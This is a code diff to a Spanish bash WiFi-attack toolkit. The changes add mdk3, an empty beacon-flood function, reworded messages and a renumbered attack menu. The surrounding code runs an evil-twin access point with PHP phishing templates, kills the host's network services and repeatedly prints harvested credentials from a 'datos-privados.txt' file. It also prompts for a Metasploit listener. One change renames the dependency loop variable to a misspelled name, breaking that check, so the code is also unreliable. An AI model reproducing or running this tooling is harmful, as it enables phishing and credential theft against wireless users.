@@ -35,7 +35,7 @@ programs() {
 	test -f /etc/redhat-release
 	fedora=$(echo $?)
 	
-	dependencias=(aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd)
+	dependencias=(aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd mdk3)
 	
 	if [ "$debian" -eq 0 ]; then 
 		clear; tput civis
@@ -83,7 +83,7 @@ programs() {
 			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
 		fi
 		
-		for program in "${dependencias[@]}"; do
+		for program in "${depasendenci[@]}"; do
 			test -f /usr/bin/$program
 			if [ "$(echo $?)" -eq 0 ]; then
 				echo -e "\n${greenColour}[+]$grayColour $program listo"
@@ -343,7 +343,7 @@ eviltrust() {
 		tput civis; while true; do
 			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
 			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-			echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
+			echo -e "${redColour}[*]$grayColour Dispositivos conectados: ${endColour}${blueColour}$activeHosts${endColour}\n"
 			find \-name datos-privados.txt | xargs cat 2>/dev/null
 			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 			activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
@@ -357,9 +357,9 @@ eviltrust() {
 		fi
 
 		rm iface 2>/dev/null
-		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
+		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre de la red a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
 		echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
-		echo -e "\n${redColour}[!]$grayColour Matando todas las conexiones...${endColour}\n"
+		echo -e "\n${redColour}[!]$grayColour Cerrando todas las conexiones...${endColour}\n"
 		sleep 2
 		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
 		sleep 5
@@ -415,13 +415,13 @@ eviltrust() {
 
 		if [ $check_plantillas -eq 1 ]; then
 			tput civis; pushd $template > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando servidor PHP...${endColour}"
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
 			sleep 2
 			popd > /dev/null 2>&1; getCredentials
 		elif [ $check_plantillas -eq 2 ]; then
 			tput civis; pushd $template > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando servidor PHP...${endColour}"
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
 			sleep 2
 			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
@@ -432,7 +432,7 @@ eviltrust() {
 			popd > /dev/null 2>&1; getCredentials
 		else
 			tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
 			pushd $template > /dev/null 2>&1
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
 			sleep 2
@@ -442,6 +442,13 @@ eviltrust() {
 	}
 		clear; echo -e "$purpleColour[*]$grayColour Iniciando EvilTrust..."; sleep 2; startAttack
 }
+beaconflood() {
+	clear; echo -e "${purpleColour}[*]$grayColour Iniciando Beacon FLood..."; sleep 2
+
+}
+
+
+
 # Comprobacion si el usuario es root
 if [ $(id -u) -ne 0 ]; then
 	echo -e "$redColour\n[!]$grayColour Debes ser root para ejecutar la herramienta -> (sudo $0)\n"
@@ -496,10 +503,11 @@ else
 				echo -e "${greenColour}\n[+]${grayColour} Targeta de Red: $tar" 
 				echo -e "${greenColour}[+]${grayColour} Direccion MAC: $(macchanger --show $tar | grep "Current MAC" | awk '{print $3}')"
 				echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Wifiphisher\t\t${turquoiseColour}[+]${grayColour} Cracking password"
-				echo -e "${yellowColour}\n[1] Ataque Handshake\t\t[4] EvilTrust (S4vitar)\t[5] Fuerza bruta (.cap)"
-				echo -e "[2] Ataque PMKID\t\t\t\t\t[6] dicc-hasheado (Rainbow taibles)"
-				echo -e "[3] Scanner de la red local"
-				echo -e "\n[7] Salir\n"
+				echo -e "${yellowColour}\n[1] Ataque Handshake\t\t[5] EvilTrust (S4vitar)\t[6] Fuerza bruta .cap"
+				echo -e "[2] Ataque PMKID\t\t\t\t\t[7] dicc-hasheado (Rainbow taibles)"
+				echo -e "[3] Beacon Flood"
+				echo -e "[4] Scanner de la red local"
+				echo -e "\n[8] Salir\n"
 				tput cnorm
 				echo -ne "${blueColour}[?]${grayColour} Seleccione un ataque: " && read opcion
 				$cleancolor
@@ -511,18 +519,21 @@ else
 				pkmid_ataque
 				;;
 				3)
-				scanner
+				beaconflood
 				;;
 				4)
-				eviltrust
+				scanner
 				;;
 				5)
-				fuerza_.cap
+				eviltrust
 				;;
 				6)
-				rainbowtaibles
+				fuerza_.cap
 				;;
 				7)
+				rainbowtaibles
+				;;
+				8)
 				salir
 				;;
 				*)
